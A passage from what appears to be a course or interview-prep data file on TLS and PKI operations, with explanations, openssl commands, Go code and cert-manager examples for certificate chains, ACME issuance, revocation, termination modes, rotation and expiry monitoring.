<tr><td>AKI/SKI, AIA, CRL DP</td><td>chain building, issuer URL, revocation info</td></tr>
<tr><td>SCT list</td><td>proof of logging in <strong>Certificate Transparency</strong> logs (required by browsers for public certs)</td></tr>
</tbody>
</table>
<p><strong>Chain of trust</strong>: leaf (server) &larr; signed by <strong>intermediate CA</strong> &larr; signed by <strong>root CA</strong>. Roots are self-signed and live in the client's trust store (OS, browser, <code>ca-certificates</code> in a container image). Roots are kept offline; intermediates do daily issuance and can be revoked/replaced without changing trust stores.</p>
<p><strong>Path validation</strong> by the client: build a chain from the leaf through the intermediates the server sent to a trusted root; verify each signature; check validity periods, basic constraints, key usage/EKU, name constraints, revocation status where checked; and verify the hostname against the SAN. The server must send <strong>leaf + intermediates</strong> (not the root).</p>
<p><strong>The missing-intermediate trap is platform-dependent</strong>, which is why it is a classic "works on my laptop" bug. Whether a client recovers depends on its verifier, not on the server:</p>
<table>
<thead><tr><th>Client</th><th>Server sends leaf only</th></tr></thead>
<tbody>
<tr><td>Go on <strong>Linux/BSD</strong> (all containers and most CI/production)</td><td><strong>fails</strong>: Go's own verifier uses only the certificates in the handshake plus the root pool and never fetches AIA &rarr; <code>x509: certificate signed by unknown authority</code></td></tr>
<tr><td>Go on <strong>Windows</strong> and <strong>macOS</strong> with system roots (<code>RootCAs == nil</code>)</td><td><strong>may succeed</strong>: Go delegates to the platform verifier (CryptoAPI, Security.framework), which can download the intermediate from the leaf's AIA "CA Issuers" URL or use a cached copy</td></tr>
<tr><td>Go on any OS with a custom <code>RootCAs</code> pool</td><td>fails: the pure-Go verifier is used everywhere</td></tr>
<tr><td>Chrome, Edge, Safari / Firefox</td><td>usually succeed (AIA fetching / Firefox preloads known intermediates)</td></tr>
<tr><td>curl+OpenSSL, <code>openssl s_client</code>, Python, Java (default)</td><td>fail ("unable to get local issuer certificate", PKIX path building failed)</td></tr>
</tbody>
</table>
<p>So a developer on a Mac or Windows laptop (or using a browser) sees a healthy endpoint, while the same Go binary in a Linux pod fails. Test chains the way production verifies them: from a Linux container, with <code>openssl s_client -showcerts</code> (count the certificates) or an SSL Labs scan ("Chain issues: Incomplete"). Fix the <em>server</em> by serving the full chain (<code>fullchain.pem</code>); never patch clients by bundling the intermediate as a root or setting <code>InsecureSkipVerify</code>.</p>
<p><strong>Certificate Transparency</strong> makes mis-issuance visible: monitor CT logs (crt.sh, Cert Spotter) for certificates issued for your domains, and restrict who may issue with <strong>CAA</strong> DNS records.</p>`,
          interview: 'Know the important extensions (SAN, EKU, basic constraints), why CN no longer matters, what the server must send in the chain, how path validation works, and CT/CAA as mis-issuance controls. A strong follow-up: explain why a missing intermediate can pass on a Mac or Windows laptop (Go uses the platform verifier, which may fetch it via AIA) yet fail in a Linux container (Go\'s own verifier never fetches), and how you would test for it.',
          examples: [
            {
              label: 'Inspect a certificate',
              lang: 'bash',
              code: `openssl s_client -connect github.com:443 -servername github.com </dev/null 2>/dev/null \\
  | openssl x509 -noout -subject -issuer -dates -serial \\
      -ext subjectAltName,keyUsage,extendedKeyUsage,basicConstraints

# subject=CN = github.com
# issuer=C = GB, O = Sectigo Limited, CN = Sectigo ECC Domain Validation Secure Server CA
# notBefore=... notAfter=...
# X509v3 Subject Alternative Name: DNS:github.com, DNS:www.github.com
# X509v3 Extended Key Usage: TLS Web Server Authentication

# Verify a chain locally
openssl verify -CAfile root.pem -untrusted intermediate.pem leaf.pem`
            }
          ]
        },
        {
          title: 'CSRs, Issuance, ACME/Let\'s Encrypt and cert-manager',
          def: `<p><strong>Issuance</strong>: generate a key pair (private key never leaves your system), create a <strong>CSR</strong> (PKCS#10: public key + requested subject/SANs, signed with the private key to prove possession), the CA validates control of the names and signs a certificate.</p>
<p>Validation levels: <strong>DV</strong> (domain control — what ACME automates), OV and EV (organization checks; no special browser UI anymore).</p>
<p><strong>ACME</strong> (RFC 8555), used by Let's Encrypt and others:</p>
<ol>
<li>Client creates an <strong>account</strong> (account key pair; requests are JWS-signed).</li>
<li>Client submits a <strong>new order</strong> for identifiers (<code>api.example.com</code>).</li>
<li>For each <strong>authorization</strong> the CA offers <strong>challenges</strong>: <code>HTTP-01</code> (serve a token at <code>/.well-known/acme-challenge/</code> on port 80), <code>DNS-01</code> (TXT record <code>_acme-challenge</code>; required for wildcards, works for internal hosts), <code>TLS-ALPN-01</code> (special cert on port 443).</li>
<li>CA validates (from multiple network perspectives).</li>
<li>Client <strong>finalizes</strong> the order with its CSR and downloads the certificate chain.</li>
<li>Renewal is the same flow, automated well before expiry (ACME Renewal Information, ARI, lets the CA suggest when).</li>
</ol>
<p><strong>Lifetimes are shrinking</strong>: the CA/Browser Forum (ballot SC-081) cuts the maximum public TLS validity from 398 days to 200 days (since 15 March 2026), 100 days (March 2027) and 47 days (March 2029), and shrinks how long a CA may reuse a domain validation to 10 days. Let's Encrypt issues 90-day certificates, offers opt-in 6-day short-lived certificates, and has announced moving its default to 45 days by 2028. Manual renewal is no longer viable — automate, and use ARI so the CA can trigger early renewal after a mass revocation.</p>
<p><strong>Server-only public certificates</strong>: browser root programs now require dedicated TLS-server hierarchies, so public CAs (Let's Encrypt included, during 2026) stop putting the <code>clientAuth</code> EKU in web certificates. Do not use public web certificates as mTLS client certificates; run a private CA for client authentication.</p>
<p><strong>cert-manager</strong> (Kubernetes): <code>Issuer</code>/<code>ClusterIssuer</code> (ACME, Vault, CA, AWS PCA, Venafi) and <code>Certificate</code> resources; it creates keys and CSRs, solves challenges, stores results in a <code>kubernetes.io/tls</code> Secret, and renews by default at two-thirds of the lifetime. Ingress controllers and Gateway API listeners consume the Secret. In plain Go, <code>golang.org/x/crypto/acme/autocert</code> handles ACME for a single binary.</p>`,
          interview: 'Explain what a CSR contains and proves, walk through the ACME flow and the challenge types (when DNS-01 is needed), and mention shrinking lifetimes (SC-081: 47 days by 2029) as the reason automation is mandatory. Know cert-manager resources.',
          examples: [
            {
              label: 'cert-manager ClusterIssuer (DNS-01) and Certificate',
              lang: 'text',
              code: `apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    server: https://acme-v02.api.letsencrypt.org/directory
    email: platform-team@example.com
    privateKeySecretRef: { name: letsencrypt-prod-account-key }
    solvers:
    - selector: { dnsZones: ["example.com"] }
      dns01:
        route53: { region: eu-west-1 }   # credentials via IRSA / EKS Pod Identity, no static keys
---
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: api-example-com
  namespace: edge
spec:
  secretName: api-example-com-tls
  dnsNames: ["api.example.com"]
  issuerRef: { kind: ClusterIssuer, name: letsencrypt-prod }
  privateKey: { algorithm: ECDSA, size: 256, rotationPolicy: Always }
  # renewBefore defaults to 1/3 of the lifetime`
            }
          ]
        },
        {
          title: 'Revocation (CRL, OCSP, Stapling), HSTS and SNI',
          def: `<p><strong>Revocation</strong> invalidates a certificate before expiry (key compromise, mis-issuance):</p>
<ul>
<li><strong>CRL</strong>: CA-signed list of revoked serials, downloaded periodically. Can be large; now partitioned.</li>
<li><strong>OCSP</strong>: client asks the CA's responder about one certificate. Privacy leak (CA sees which sites you visit), latency, and browsers <strong>soft-fail</strong> (if the responder is unreachable they accept the cert — so an attacker who blocks OCSP wins).</li>
<li><strong>OCSP stapling</strong>: the server fetches a signed OCSP response and staples it into the handshake; <strong>Must-Staple</strong> made it hard-fail but saw little adoption.</li>
<li><strong>Industry direction</strong>: CA/B Forum rules made OCSP optional and CRLs mandatory for public CAs (2024); Let's Encrypt removed OCSP URLs from its certificates and shut down its OCSP responders in 2025 (Must-Staple certificates went with it) and publishes CRLs only; browsers aggregate CRLs and push revocation data themselves (Chrome CRLSets, Firefox CRLite). Consequence: a server with OCSP stapling configured simply has nothing to staple for such certificates — monitor stapling errors rather than treating them as fatal. The real answer is <strong>short-lived certificates</strong>: if a cert lives days, revocation matters much less.</li>
</ul>
<p>For <strong>internal PKI</strong> (mTLS), you control the clients: either distribute CRLs, or (better) issue very short-lived certificates (hours, as SPIFFE/SPIRE and service meshes do) so expiry is the revocation mechanism.</p>
<p><strong>HSTS</strong> (<code>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</code>, RFC 6797) tells browsers to use HTTPS only for the domain, preventing SSL-stripping downgrade attacks and click-through on certificate errors. The <em>preload list</em> protects even the very first visit; roll out gradually (short max-age first) because it's hard to undo.</p>
<p><strong>SNI</strong> (Server Name Indication) puts the hostname in the ClientHello so one IP can serve many certificates; it is visible to on-path observers. <strong>ECH</strong> (Encrypted Client Hello) encrypts it using a key published in DNS (HTTPS records). <strong>ALPN</strong> negotiates the application protocol (<code>h2</code>, <code>http/1.1</code>) inside the handshake.</p>`,
          interview: 'Explain why revocation is "broken" (soft-fail OCSP, privacy, latency), what stapling fixes, and why the ecosystem moved to CRLs + short-lived certs (Let\'s Encrypt ended OCSP in 2025). Know HSTS directives and the preload caveat, SNI vs ECH, and ALPN.',
          examples: [
            {
              label: 'Check HSTS, stapling and ALPN',
              lang: 'bash',
              code: `# HSTS header
curl -sI https://example.com | grep -i strict-transport-security

# OCSP stapling status (servers that still staple)
openssl s_client -connect example.com:443 -servername example.com -status </dev/null 2>/dev/null \\
  | grep -A3 'OCSP response'

# Where to check revocation info in the certificate
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \\
  | openssl x509 -noout -ext crlDistributionPoints,authorityInfoAccess

# ALPN negotiation
openssl s_client -connect example.com:443 -alpn h2 </dev/null 2>/dev/null | grep -i alpn`
            }
          ]
        },
        {
          title: 'TLS Termination vs Passthrough, and Certificate Rotation',
          def: `<table>
<thead><tr><th>Mode</th><th>Where TLS ends</th><th>Pros</th><th>Cons</th></tr></thead>
<tbody>
<tr><td><strong>Edge termination</strong></td><td>load balancer / ingress / API gateway</td><td>L7 routing, WAF, caching, header injection, central cert management</td><td>plaintext inside unless re-encrypted; LB holds keys</td></tr>
<tr><td><strong>Re-encryption (bridging)</strong></td><td>terminated at edge, new TLS to backend</td><td>L7 features + encrypted hops</td><td>two cert sets; backend sees LB as client (forward client identity in headers or mTLS)</td></tr>
<tr><td><strong>Passthrough</strong></td><td>at the backend pod</td><td>end-to-end encryption, backend controls TLS (e.g. its own mTLS)</td><td>no L7 features at the edge; routing by SNI only; each backend manages certs</td></tr>
</tbody>
</table>
<p>In Kubernetes the common pattern is <strong>edge termination at the ingress/Gateway with public certs</strong> (cert-manager + ACME) and <strong>mTLS inside the cluster</strong> (service mesh with short-lived internal certs). Passthrough is used when the backend must see the client certificate itself or compliance requires true end-to-end TLS.</p>
<p><strong>Certificate expiry incidents</strong> are among the most common self-inflicted outages (Microsoft Teams 2020, the Let's Encrypt DST Root CA X3 expiry breaking old clients in 2021, and many internal mTLS outages when an intermediate or root expired). Prevention:</p>
<ol>
<li><strong>Automate issuance and renewal</strong> (ACME, cert-manager, SPIRE) — humans forget.</li>
<li><strong>Inventory</strong> every certificate, including internal CAs, intermediates, client certs, and certificates embedded in configs and partner integrations.</li>
<li><strong>Monitor from the outside</strong>: probe endpoints (Prometheus blackbox exporter <code>probe_ssl_earliest_cert_expiry</code>), alert at 30/14/7 days, and alert if renewal jobs fail.</li>
<li><strong>Hot-reload</strong> certificates without restarts (Go: <code>tls.Config.GetCertificate</code>), and verify the <em>served</em> certificate changed after renewal.</li>
<li>Plan root/intermediate rotation years ahead with overlapping trust (cross-signing, dual roots in bundles).</li>
</ol>`,
          interview: 'Compare termination, re-encryption and passthrough with trade-offs, and describe a standard Kubernetes setup. For rotation, show you have an operational plan: automation, inventory, external expiry monitoring, hot reload, and CA rotation with overlap.',
          examples: [
            {
              label: 'Hot-reloading certificates in a Go server',
              lang: 'go',
              code: `type CertReloader struct {
    certFile, keyFile string
    cur               atomic.Pointer[tls.Certificate]
}

func (c *CertReloader) Load() error {
    kp, err := tls.LoadX509KeyPair(c.certFile, c.keyFile) // Go 1.23+: kp.Leaf is populated
    if err != nil {
        return err
    }
    c.cur.Store(&kp)
    certExpiry.Set(float64(kp.Leaf.NotAfter.Unix())) // Prometheus gauge for alerting
    return nil
}

func (c *CertReloader) GetCertificate(*tls.ClientHelloInfo) (*tls.Certificate, error) {
    return c.cur.Load(), nil
}

func (c *CertReloader) Watch(ctx context.Context, every time.Duration) {
    t := time.NewTicker(every) // Kubernetes updates mounted Secrets via an atomic symlink swap
    defer t.Stop()
    for {
        select {
        case <-ctx.Done():
            return
        case <-t.C:
            if err := c.Load(); err != nil {
                slog.Error("cert reload failed; keeping previous certificate", "err", err)
            }
        }
    }
}

// srv.TLSConfig = &tls.Config{MinVersion: tls.VersionTLS12, GetCertificate: reloader.GetCertificate}
// srv.ListenAndServeTLS("", "")  // empty paths: certificates come from GetCertificate`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Inspect a website\'s TLS configuration and certificate chain',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>Use <code>openssl s_client</code> with <code>-servername</code> (SNI) and <code>-showcerts</code>.</li><li>Record: protocol, cipher, key exchange group, chain depth, issuer, SANs, expiry, HSTS.</li><li>Compare with a scanner such as testssl.sh.</li></ul>`,
          solution: `HOST=www.example.org
openssl s_client -connect $HOST:443 -servername $HOST -brief </dev/null
# Protocol version: TLSv1.3 / Ciphersuite: TLS_AES_256_GCM_SHA384 / Negotiated TLS1.3 group: X25519MLKEM768 ...

openssl s_client -connect $HOST:443 -servername $HOST -showcerts </dev/null 2>/dev/null \\
  | awk '/BEGIN CERT/,/END CERT/' > chain.pem
grep -c 'BEGIN CERTIFICATE' chain.pem           # leaf + intermediates (root should NOT be sent)

openssl x509 -in chain.pem -noout -subject -issuer -enddate -ext subjectAltName
curl -sI https://$HOST | grep -i strict-transport-security

# Days until expiry
end=$(openssl x509 -in chain.pem -noout -enddate | cut -d= -f2)
echo $(( ( $(date -d "$end" +%s) - $(date +%s) ) / 86400 )) days left`,
          lang: 'bash'
        },
        {
          t: 'Configure a hardened HTTPS server in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li><code>MinVersion: tls.VersionTLS12</code> (or 1.3 for internal); leave suites to Go's defaults.</li><li>Server timeouts (<code>ReadHeaderTimeout</code> etc.) — Slowloris defense.</li><li>HSTS header; redirect port 80 to 443.</li><li>Serve the full chain (leaf + intermediates) in the cert file.</li></ul>`,
          solution: `func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, _ *http.Request) { w.Write([]byte("ok")) })

    srv := &http.Server{
        Addr:    ":8443",
        Handler: securityHeaders(mux),
        TLSConfig: &tls.Config{
            MinVersion: tls.VersionTLS12, // TLS 1.3 preferred automatically; X25519MLKEM768 offered (Go 1.24+)
        },
        ReadHeaderTimeout: 5 * time.Second,
        ReadTimeout:       30 * time.Second,
        WriteTimeout:      30 * time.Second,
        IdleTimeout:       120 * time.Second,
        MaxHeaderBytes:    1 << 20,
    }

    go func() { // HTTP -> HTTPS redirect
        log.Println(http.ListenAndServe(":8080", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            http.Redirect(w, r, "https://"+r.Host+r.URL.RequestURI(), http.StatusPermanentRedirect)
        })))
    }()
    // fullchain.pem = leaf followed by intermediate(s)
    log.Fatal(srv.ListenAndServeTLS("/certs/fullchain.pem", "/certs/privkey.pem"))
}

func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        h := w.Header()
        h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
        h.Set("X-Content-Type-Options", "nosniff")
        h.Set("Content-Security-Policy", "default-src 'self'; frame-ancestors 'none'")
        h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
        next.ServeHTTP(w, r)
    })
}`,
          lang: 'go'
        },
        {
          t: 'Create a private CA and issue a server certificate with SANs',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Root: self-signed, <code>CA:TRUE</code>, <code>keyCertSign</code>; keep the key offline.</li><li>Server: key + CSR; sign with SANs, <code>CA:FALSE</code>, EKU <code>serverAuth</code>, short validity.</li><li>Verify chain and SANs; test with <code>curl --cacert</code>.</li></ul>`,
          solution: `# 1) Root CA (P-256), 10 years, offline in real life
openssl req -x509 -new -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 \\
  -keyout ca.key -out ca.crt -days 3650 -subj "/CN=Acme Internal Root CA" \\
  -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign,cRLSign"

# 2) Server key + CSR
openssl req -new -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 \\
  -keyout orders.key -out orders.csr -subj "/CN=orders.payments.svc"

# 3) Sign with explicit extensions (never blindly copy extensions from a CSR)
cat > orders.ext <<'EOF'
basicConstraints=critical,CA:FALSE
keyUsage=critical,digitalSignature
extendedKeyUsage=serverAuth
subjectAltName=DNS:orders.payments.svc,DNS:orders.payments.svc.cluster.local
EOF
openssl x509 -req -in orders.csr -CA ca.crt -CAkey ca.key -CAcreateserial \\
  -days 30 -sha256 -extfile orders.ext -out orders.crt

# 4) Verify
openssl verify -CAfile ca.crt orders.crt                       # orders.crt: OK
openssl x509 -in orders.crt -noout -ext subjectAltName,extendedKeyUsage

# 5) Test
openssl s_server -accept 8443 -cert orders.crt -key orders.key -www &
curl --cacert ca.crt --resolve orders.payments.svc:8443:127.0.0.1 https://orders.payments.svc:8443/ -o /dev/null -w '%{http_code}\\n'
# Production: use an intermediate CA (root offline), or Vault PKI / AWS Private CA / cert-manager CA issuer.`,
          lang: 'bash'
        },
        {
          t: 'Diagnose the most common TLS errors in Go clients',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li><em>unknown authority</em>: missing intermediate on the server, private CA not in the pool, or no CA bundle in a distroless/scratch image.</li><li>"It works on my laptop": on Windows and macOS Go uses the platform verifier, which may fetch a missing intermediate via AIA; reproduce from a Linux container, where Go's own verifier never does.</li><li><em>valid for X, not Y</em>: SAN mismatch (CN is ignored).</li><li><em>expired or not yet valid</em>: expiry or clock skew.</li><li>Never "fix" with <code>InsecureSkipVerify</code>.</li></ul>`,
          solution: `1) x509: certificate signed by unknown authority
   a. Server sends only the leaf:      openssl s_client -showcerts ... | grep -c BEGIN  -> 1  => serve fullchain.pem
      Often only Linux pods fail: on Windows/macOS (system roots) Go asks the OS verifier, which can
      download the intermediate via AIA, so the same binary "works" on a dev laptop. Fix the server chain.
   b. Private CA:                     pool := x509.NewCertPool(); pool.AppendCertsFromPEM(caPEM)
                                       tr := &http.Transport{TLSClientConfig: &tls.Config{RootCAs: pool}}
   c. scratch image has no CA bundle:  COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
                                       (distroless/static already includes it) or import golang.org/x/crypto/x509roots/fallback

2) x509: certificate is valid for orders.internal, not orders.payments.svc
   -> client dials a name not in SAN. Reissue with all names clients use, or dial the right name;
      for IP access put IP SANs in the cert. (Since Go 1.15 CN is not used for hostname checks.)

3) x509: certificate has expired or is not yet valid: current time ... is after ...
   -> check notAfter; if notBefore is in the future, the client clock is wrong (NTP).

4) tls: failed to verify certificate: x509: certificate specifies an incompatible key usage
   -> cert lacks serverAuth (or clientAuth for mTLS) EKU; reissue.

5) remote error: tls: handshake failure / protocol version not supported
   -> client MinVersion TLS1.3 vs legacy server TLS1.0, or no shared cipher; upgrade server.`,
          lang: 'text'
        },
        {
          t: 'Automate public certificates with cert-manager and Let\'s Encrypt',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Start with the Let's Encrypt <em>staging</em> directory to avoid rate limits.</li><li>HTTP-01 for public single names; DNS-01 for wildcards/internal names with workload identity for DNS API credentials.</li><li>Debug via Certificate &rarr; CertificateRequest &rarr; Order &rarr; Challenge resources.</li></ul>`,
          solution: `helm repo add jetstack https://charts.jetstack.io && helm repo update
helm install cert-manager jetstack/cert-manager -n cert-manager --create-namespace --set crds.enabled=true

kubectl apply -f clusterissuer-staging.yaml   # server: https://acme-staging-v02.api.letsencrypt.org/directory
kubectl apply -f certificate.yaml             # see the module example

# Follow the chain of resources
kubectl get certificate,certificaterequest,order,challenge -n edge
kubectl describe challenge -n edge            # e.g. "Waiting for DNS-01 propagation" or HTTP-01 404 from ingress
cmctl status certificate api-example-com -n edge

# Verify the served cert after Ready=True
openssl s_client -connect api.example.com:443 -servername api.example.com </dev/null 2>/dev/null \\
  | openssl x509 -noout -issuer -enddate

# Switch to the production ClusterIssuer, force renewal to test the path end to end
cmctl renew api-example-com -n edge
# Alert on: certmanager_certificate_expiration_timestamp_seconds - time() < 14d, and Ready=False`,
          lang: 'bash'
        },
        {
          t: 'Choose TLS termination, re-encryption or passthrough for three workloads',
          d: 'medium',
          type: 'design',
          hint: `<ul><li>Does the edge need L7 features (WAF, path routing, auth)?</li><li>Must the backend see the client certificate?</li><li>Compliance requirements for encryption in transit inside the VPC/cluster?</li></ul>`,
          solution: `1. Public web/API behind a WAF:
   Terminate at the cloud LB/ingress (public ACME cert), WAF + rate limiting at L7,
   re-encrypt to pods via mesh mTLS (internal CA, 24h certs). Forward client IP via X-Forwarded-For from trusted proxies only.

2. Partner B2B API authenticated with client certificates:
   Option A: terminate mTLS at the gateway (it verifies client certs against the partner CA bundle) and pass the
   verified identity to the backend in a signed header / internal token (never a raw header from the client).
   Option B: TLS passthrough (SNI routing) so the Go service performs mTLS itself - simpler trust, no L7 at the edge.

3. Database / Kafka connections:
   Passthrough / end-to-end TLS to the broker or DB (they speak their own protocols), with server certificate
   verification enabled in clients (sslmode=verify-full for Postgres).

Rules: never leave plaintext across a trust boundary; keep private keys where the TLS ends;
document where TLS ends in architecture diagrams.`,
          lang: 'text'
        },
        {
          t: 'Hot-reload rotated certificates without restarting a Go service',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Use <code>tls.Config.GetCertificate</code> (server) and <code>GetClientCertificate</code> (client) backed by an <code>atomic.Pointer</code>.</li><li>Reload periodically or on file events; keep the old cert if the new one fails to parse.</li><li>Also reload CA pools for mTLS (<code>GetConfigForClient</code> returning a fresh config).</li></ul>`,
          solution: `// Server certificate: see the CertReloader example in this module.

// mTLS server that also hot-reloads the client CA bundle
type TLSState struct {
    cert atomic.Pointer[tls.Certificate]
    cas  atomic.Pointer[x509.CertPool]
}

func (s *TLSState) ServerConfig() *tls.Config {
    return &tls.Config{
        MinVersion: tls.VersionTLS13,
        GetConfigForClient: func(*tls.ClientHelloInfo) (*tls.Config, error) {
            return &tls.Config{ // evaluated per handshake -> picks up rotated CA bundle and cert
                MinVersion:   tls.VersionTLS13,
                Certificates: []tls.Certificate{*s.cert.Load()},
                ClientCAs:    s.cas.Load(),
                ClientAuth:   tls.RequireAndVerifyClientCert,
            }, nil
        },
    }
}

// Client side: present the current client cert on every new connection
func (s *TLSState) ClientConfig(roots *x509.CertPool) *tls.Config {
    return &tls.Config{
        MinVersion: tls.VersionTLS13,
        RootCAs:    roots,
        GetClientCertificate: func(*tls.CertificateRequestInfo) (*tls.Certificate, error) {
            return s.cert.Load(), nil
        },
    }
}
// Note: existing keep-alive connections keep the old cert until they close; set IdleConnTimeout / MaxConnAge-like
// rotation so long-lived connections pick up new certs before the old ones expire.`,
          lang: 'go'
        },
        {
          t: 'Build certificate-expiry monitoring for a fleet of endpoints',
          d: 'hard',
          type: 'coding',
          hint: `<ul><li>Probe each endpoint (with SNI), check <em>every</em> certificate in the presented chain, not just the leaf.</li><li>Export days-to-expiry as metrics; alert at 30/14/7 days and on probe failures.</li><li>Also cover non-HTTP endpoints (DB, Kafka, SMTP STARTTLS) and internal CAs.</li></ul>`,
          solution: `type Result struct {
    Target   string
    NotAfter time.Time // earliest in chain
    Subject  string
    Err      error
}

func Probe(ctx context.Context, hostport, sni string, roots *x509.CertPool) Result {
    d := &tls.Dialer{Config: &tls.Config{ServerName: sni, RootCAs: roots, MinVersion: tls.VersionTLS12}}
    ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
    defer cancel()
    conn, err := d.DialContext(ctx, "tcp", hostport)
    if err != nil {
        return Result{Target: hostport, Err: err} // also catches chain/hostname errors
    }
    defer conn.Close()
    st := conn.(*tls.Conn).ConnectionState()
    r := Result{Target: hostport}
    for _, chain := range st.VerifiedChains {
        for _, c := range chain {
            if r.NotAfter.IsZero() || c.NotAfter.Before(r.NotAfter) {
                r.NotAfter, r.Subject = c.NotAfter, c.Subject.String()
            }
        }
    }
    return r
}

// Run every 10 min over the inventory; export:
//   tls_cert_earliest_expiry_seconds{target, subject}  = r.NotAfter.Unix()
//   tls_probe_success{target}                          = 0|1
// Prometheus alert:
//   (tls_cert_earliest_expiry_seconds - time()) / 86400 < 14   for: 1h   severity: page
//   tls_probe_success == 0                                       for: 15m
// Off-the-shelf alternative: blackbox_exporter probe_ssl_earliest_cert_expiry.
// Inventory source: CT logs for public names + cert-manager Certificates + internal CA issuance DB.`,
          lang: 'go'
        },
        {
          t: 'Run a postmortem for a certificate-expiry outage',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Blameless timeline: what expired, why renewal didn't happen, why monitoring didn't catch it, time to detect/mitigate.</li><li>Root causes are usually ownership, manual steps, and monitoring of the wrong thing (the file instead of the served cert).</li><li>Action items: automation, inventory, alerting, game days.</li></ul>`,
          solution: `Incident: internal intermediate CA used for service mTLS expired at 02:14 UTC; all east-west calls failed (503s).
Timeline: 02:14 errors spike -> 02:20 page -> 02:55 diagnosed "x509: certificate has expired" on intermediate ->
          03:40 new intermediate issued from offline root, distributed -> 04:30 full recovery.
Root causes:
  1. Intermediate created manually 3 years ago with a 3-year lifetime; owner left the company.
  2. Leaf certs auto-rotated daily, so dashboards (leaf expiry) were green; nobody monitored chain certs.
  3. Distribution of a new intermediate required redeploying all workloads.
What went well: offline root ceremony runbook existed.
Action items:
  - Monitor earliest expiry across the whole presented chain (probe) + internal CA inventory (owner, expiry) [P0]
  - Alerts at 90/30/14 days for CA certs; 14/7 days for leaves; renewal-job failure alerts [P0]
  - Automate intermediate rotation (Vault PKI / SPIRE upstream authority) with overlap: new intermediate issued
    months ahead, trust bundles contain old + new [P1]
  - Hot-reload trust bundles in services (GetConfigForClient) [P1]
  - Quarterly game day: expire a cert in staging and measure detection time [P2]`,
          lang: 'text'
        },
        {
          t: 'Design an internal PKI for service-to-service TLS',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Hierarchy: offline root &rarr; online intermediates per environment/cluster (name-constrained).</li><li>Issuance: automated, short-lived (hours to days), identity-based (SPIFFE IDs in URI SANs).</li><li>Trust distribution and rotation with overlap; revocation via short lifetimes; audit.</li></ul>`,
          solution: `Hierarchy
  Root CA: offline (HSM or air-gapped), 10-15 years, used only to sign intermediates (ceremony, 2-person rule)
  Intermediates: one per environment/region (prod-eu, prod-us, staging), 1-2 years, keys in KMS/HSM-backed
                 issuer (Vault PKI, AWS Private CA, Google CAS); name constraints to internal domains / spiffe://prod...
Issuance
  Workload certs via SPIRE (SVIDs) or mesh CA (istiod) or cert-manager CA issuer; 1-24h lifetimes; automatic rotation
  Identity in URI SAN: spiffe://prod.example.com/ns/payments/sa/orders; EKU serverAuth+clientAuth
  Attestation: SPIRE node + workload attestation (K8s SA, namespace, image) before issuing
Trust distribution
  Trust bundle (root + intermediates) distributed by SPIRE/mesh; services hot-reload bundles
  Rotation: issue new intermediate months before expiry; bundles carry old+new; switch issuance; retire old
Revocation
  Short lifetimes are the primary mechanism; emergency: remove compromised intermediate from bundle + reissue
Ops
  Inventory and expiry monitoring for CA certs; audit log of all issuance; alert on unusual issuance volume;
  policy: no wildcard internal certs, no certs longer than 30 days outside the CA layer.`,
          lang: 'text'
        },
        {
          t: 'Reproduce a missing-intermediate bug that fails only in Linux containers',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Symptom: a Go service in Kubernetes gets <code>x509: certificate signed by unknown authority</code> calling a partner API, but the same code works on developers' Macs and Windows laptops and in the browser.</li><li>On Windows/macOS with system roots, Go uses the platform verifier, which may fetch a missing intermediate via the leaf's AIA URL; on Linux Go's own verifier never fetches.</li><li>Reproduce like production (Linux container), count the certificates the server sends, fix the server chain, and add a regression check.</li></ul>`,
          solution: `# 1) Reproduce exactly like production: Linux + Go's own verifier
cat > main.go <<'EOF'
package main

import (
    "fmt"
    "net/http"
    "os"
)

func main() {
    _, err := http.Get(os.Args[1])
    fmt.Println("err:", err)
}
EOF
docker run --rm -v "$PWD":/src -w /src golang:1.25 go run main.go https://partner.example.com/
# err: ... tls: failed to verify certificate: x509: certificate signed by unknown authority
# Same program on macOS/Windows: err: <nil>   (OS verifier downloaded the intermediate via AIA)

# 2) What does the server actually send?
openssl s_client -connect partner.example.com:443 -servername partner.example.com -showcerts </dev/null 2>/dev/null \
  | grep -c 'BEGIN CERTIFICATE'          # 1 => leaf only (expected 2+: leaf + intermediate)
openssl s_client -connect partner.example.com:443 -servername partner.example.com </dev/null 2>&1 \
  | grep -E 'verify error|Verify return code'   # unable to get local issuer certificate (20/21)

# Which intermediate is missing? The leaf's AIA extension names it:
openssl s_client -connect partner.example.com:443 -servername partner.example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -ext authorityInfoAccess     # CA Issuers - URI:http://.../intermediate.crt

# 3) Fix on the SERVER (ask the partner if it is theirs):
#    nginx: ssl_certificate fullchain.pem (leaf first, then intermediates)
#    Kubernetes TLS Secret: tls.crt must contain leaf + intermediate (cert-manager does this)
#    Go server: tls.LoadX509KeyPair("fullchain.pem", "key.pem")
#    Do NOT "fix" clients by adding the intermediate as a root or using InsecureSkipVerify:
#    when the CA rotates its intermediate, the pinned copy breaks again.

# 4) Regression guards
#  - synthetic check from a Linux runner: chain length >= 2 and verify OK
#  - in Go tests, verify with an explicit RootCAs pool: that forces Go's own verifier on every OS,
#    so laptops fail the same way production does`,
          lang: 'bash'
        }
      ],
